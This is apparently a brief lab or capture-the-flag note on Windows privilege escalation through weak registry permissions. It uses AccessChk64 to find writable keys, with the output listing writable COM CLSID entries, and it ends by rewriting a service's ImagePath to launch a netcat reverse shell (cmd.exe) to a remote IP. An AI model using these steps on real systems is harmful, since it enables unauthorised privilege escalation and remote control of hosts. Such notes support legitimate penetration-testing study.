You can enumerate for passwords or misconfigurations in permission of Key and values in registry

## Hunting Weak Permissions
We will use `AccessChk64.exe` from SysinternalsSuite, You can change which hive registry you would like to search in and it will recurse all the paths.

```powershell
.\accesschk64.exe "rustykey\ee.reed" -kvuqsw HKCR:\ -accepteula
Copyright  2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}
        KEY_ALL_ACCESS
RW HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
        KEY_ALL_ACCESS
RW HKCR\WOW6432Node\CLSID\{23170F69-40C1-278A-1000-000100020000}
        KEY_ALL_ACCESS
RW HKCR\WOW6432Node\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
        KEY_ALL_ACCESS

# hklm\System\CurrentControlSet\services to check services.

```

Changing the value
```powershell
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```